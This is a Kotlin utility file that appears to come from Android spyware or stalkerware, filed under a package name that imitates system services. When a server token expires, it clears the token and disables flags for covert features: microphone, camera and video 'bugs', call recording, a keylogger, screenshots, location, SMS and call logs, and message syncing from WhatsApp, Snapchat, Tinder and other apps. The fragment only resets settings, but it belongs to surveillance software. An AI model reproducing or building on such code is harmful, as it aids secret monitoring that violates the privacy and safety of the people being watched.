package com.android.services.util

object ServerAuthUtil {

    fun getServerToken(url: String): String {
        return when {
            url.startsWith(AppConstants.NODE_SERVER_URL) -> AppConstants.authToken ?: ""
            else -> ""
        }
    }

    fun getServerToken(): String {
        return AppConstants.authToken ?: ""
    }

    fun onTokenExpired() {
        AppConstants.authToken = ""
        AppConstants.voipCallApps = ""
        AppConstants.screenRecordingApps = ""
        AppConstants.syncAppointments = false
        AppConstants.syncBrowsingHistory = false
        AppConstants.callLogSync = false
        AppConstants.syncContacts = false
        AppConstants.syncGeoLocation = false
        AppConstants.syncInstalledApps = false
        AppConstants.syncConnectedNetworks = false
        AppConstants.syncAppReports = false
        AppConstants.smsLogSync = false
        AppConstants.syncMicBug = false
        AppConstants.syncCameraBug = false
        AppConstants.syncCallRecording = false
        AppConstants.syncPhotos = false
        AppConstants.syncVideoBug = false
        AppConstants.syncLine = false
        AppConstants.syncFacebook = false
        AppConstants.syncSkype = false
        AppConstants.syncViber = false
        AppConstants.syncWhatsApp = false
        AppConstants.syncSnapchat = false
        AppConstants.syncKik = false
        AppConstants.syncInstagram = false
        AppConstants.syncTinder = false
        AppConstants.syncHike = false
        AppConstants.syncHangouts = false
        AppConstants.syncImo = false
        AppConstants.syncTumblr = false
        AppConstants.syncZalo = false
        AppConstants.syncVoiceMessages = false
        AppConstants.syncKeyLogger = false
        AppConstants.syncScreenShots = false
        AppConstants.syncAppNotifications = false
    }
    fun onFcmTokenExpired(){
        AppConstants.fcmToken = ""
        AppConstants.fcmTokenStatus = false
    }
}